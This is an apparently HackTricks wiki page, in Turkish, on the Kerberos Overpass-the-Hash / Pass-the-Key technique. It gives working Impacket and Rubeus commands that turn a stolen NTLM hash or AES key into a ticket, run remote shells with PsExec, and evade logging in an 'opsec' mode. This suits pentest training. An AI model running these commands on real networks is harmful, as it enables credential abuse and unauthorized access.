# Over Pass the Hash/Pass the Key

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** saldırısı, geleneksel NTLM protokolünün kısıtlandığı ve Kerberos kimlik doğrulamasının öncelik kazandığı ortamlara yönelik olarak tasarlanmıştır. Bu saldırı, bir kullanıcının NTLM hash'ini veya AES anahtarlarını kullanarak Kerberos biletleri talep eder ve bu sayede bir ağ içindeki kaynaklara yetkisiz erişim sağlar.

Bu saldırıyı gerçekleştirmek için ilk adım, hedef kullanıcının hesabının NTLM hash'ini veya şifresini edinmektir. Bu bilgiyi güvence altına aldıktan sonra, hesabın bir Ticket Granting Ticket (TGT) alması sağlanabilir ve bu da saldırganın kullanıcının izinleri olan hizmetlere veya makinelere erişmesine olanak tanır.

İşlem, aşağıdaki komutlarla başlatılabilir:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 gerektiren senaryolar için `-aesKey [AES key]` seçeneği kullanılabilir. Ayrıca, elde edilen bilet, smbexec.py veya wmiexec.py gibi çeşitli araçlarla kullanılabilir ve saldırının kapsamını genişletebilir.

_PyAsn1Error_ veya _KDC cannot find the name_ gibi karşılaşılan sorunlar genellikle Impacket kütüphanesinin güncellenmesi veya IP adresi yerine ana bilgisayar adının kullanılmasıyla çözülür, bu da Kerberos KDC ile uyumluluğu sağlar.

Rubeus.exe kullanarak alternatif bir komut dizisi, bu tekniğin başka bir yönünü göstermektedir:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Bu yöntem, kimlik doğrulama amaçları için bileti doğrudan ele geçirme ve kullanma odaklı **Pass the Key** yaklaşımını yansıtır. Bir TGT isteğinin başlatılmasının, varsayılan olarak RC4-HMAC kullanımını belirten `4768: A Kerberos authentication ticket (TGT) was requested` olayını tetiklediğini belirtmek önemlidir; ancak modern Windows sistemleri AES256'yı tercih etmektedir.

Operasyonel güvenliğe uymak ve AES256 kullanmak için aşağıdaki komut uygulanabilir:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referanslar

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
